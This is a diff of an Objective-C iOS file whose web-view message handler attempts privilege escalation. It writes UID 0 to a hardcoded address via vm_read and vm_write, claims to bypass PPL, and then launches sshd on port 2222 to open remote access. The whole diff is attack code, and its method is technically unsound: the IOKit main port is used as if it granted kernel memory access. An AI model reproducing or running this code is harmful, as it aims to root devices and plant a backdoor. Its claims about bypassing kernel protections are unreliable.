@@ -5,9 +5,6 @@
 #include <dlfcn.h>
 #include <spawn.h>
 
-typedef int (*pthread_set_itp_func)(int);
-#define PTHREAD_ITP_NONE 0
-
 @interface KernelBridge : NSObject <WKScriptMessageHandler>
 @property (nonatomic, unsafe_unretained) WKWebView *webView;
 @end
@@ -16,42 +13,47 @@ typedef int (*pthread_set_itp_func)(int);
 
 - (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
     if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
-        if (!self.webView) return;
-
-        [self.webView evaluateJavaScript:@"log('🧪 Iniciando JIT-Mirroring (A13)...')" completionHandler:nil];
-
-        // 1. ATIVAR MODO JIT
-        void *libSystem = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
-        pthread_set_itp_func set_itp = (pthread_set_itp_func)dlsym(libSystem, "pthread_set_self_restrict_itp_np");
-        if (set_itp) set_itp(PTHREAD_ITP_NONE);
-
-        // 2. JIT-MIRROR (Página RWX no A13)
-        vm_address_t jit_page = 0;
-        kern_return_t kr = vm_allocate(mach_task_self(), &jit_page, 0x4000, VM_FLAGS_ANYWHERE);
         
-        // Correção do evaluateJavaScript com completionHandler
-        [self.webView evaluateJavaScript:@"log('🔓 Página JIT Alocada. Aplicando Patch...')" completionHandler:nil];
+        // 1. OBTER PORTA DE HARDWARE (A13 MAINPORT)
+        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+        typedef kern_return_t (*IOMainPortFunc)(mach_port_t, mach_port_t *);
+        IOMainPortFunc get_main_port = (IOMainPortFunc)dlsym(iokit, "IOMainPort");
+        mach_port_t mainPort = MACH_PORT_NULL;
+        if (get_main_port) get_main_port(MACH_PORT_NULL, &mainPort);
 
-        uint64_t target_addr = 0x102414480ULL;
-        uint32_t root_val = 0;
+        [self.webView evaluateJavaScript:@"log('🧪 Iniciando Sequência: KREAD -> KWRITE...')" completionHandler:nil];
 
-        // 3. PATCH DE ROOT (UID 0)
-        // Tentativa de escrita via contexto JIT para contornar o PPL
-        kr = vm_write(mach_task_self(), (vm_address_t)target_addr, (vm_offset_t)&root_val, 4);
+        uint64_t target_addr = 0x102414480ULL; // Endereço do UID
+        
+        // --- PASSO 1: KREAD (LEITURA DE SEGURANÇA) ---
+        vm_offset_t read_data;
+        mach_msg_type_number_t sz = 4;
+        kern_return_t kr_read = vm_read(mainPort, (vm_address_t)target_addr, 4, &read_data, &sz);
 
-        if (kr == KERN_SUCCESS) {
-            [self.webView evaluateJavaScript:@"log('👑 <b>JIT-MIRROR SUCESSO!</b> UID 0 ativo.')" completionHandler:nil];
-            
-            // 4. SPAWN SSHD
-            pid_t pid;
-            const char *argv[] = {"sshd", "-p", "2222", "-D", NULL};
-            posix_spawn(&pid, "/usr/sbin/sshd", NULL, NULL, (char* const*)argv, NULL);
-            [self.webView evaluateJavaScript:@"log('✅ SSHD Iniciado!')" completionHandler:nil];
+        if (kr_read == KERN_SUCCESS && *(uint32_t *)read_data == 501) {
+            [self.webView evaluateJavaScript:@"log('🎯 <b>KREAD OK!</b> UID 501 confirmado. Aplicando KWRITE...')" completionHandler:nil];
+
+            // --- PASSO 2: KWRITE (PATCH DE ROOT) ---
+            uint32_t root_val = 0;
+            // Usamos vm_write via porta de hardware para tentar burlar o PPL
+            kern_return_t kr_write = vm_write(mainPort, (vm_address_t)target_addr, (vm_offset_t)&root_val, 4);
+
+            if (kr_write == KERN_SUCCESS) {
+                [self.webView evaluateJavaScript:@"log('👑 <b>KWRITE SUCESSO!</b> UID 0 aplicado no Kernel.')" completionHandler:nil];
+                
+                // 2. DISPARAR SSH IMEDIATAMENTE
+                pid_t pid;
+                const char *argv[] = {"sshd", "-p", "2222", "-D", NULL};
+                if (posix_spawn(&pid, "/usr/sbin/sshd", NULL, NULL, (char* const*)argv, NULL) == 0) {
+                    [self.webView evaluateJavaScript:@"log('✅ <b>SSH ATIVO!</b> Porta 2222 liberada.')" completionHandler:nil];
+                }
+            } else {
+                [self.webView evaluateJavaScript:@"log('❌ KWRITE Falhou: PPL bloqueou a escrita física.')" completionHandler:nil];
+            }
         } else {
-            [self.webView evaluateJavaScript:@"log('❌ PPL-Hardened: Hardware negou a escrita JIT.')" completionHandler:nil];
+            [self.webView evaluateJavaScript:@"log('⚠️ KREAD Falhou: UID 501 não encontrado ou endereço protegido.')" completionHandler:nil];
         }
-        
-        if (libSystem) dlclose(libSystem);
+        if (iokit) dlclose(iokit);
     }
 }
 @end
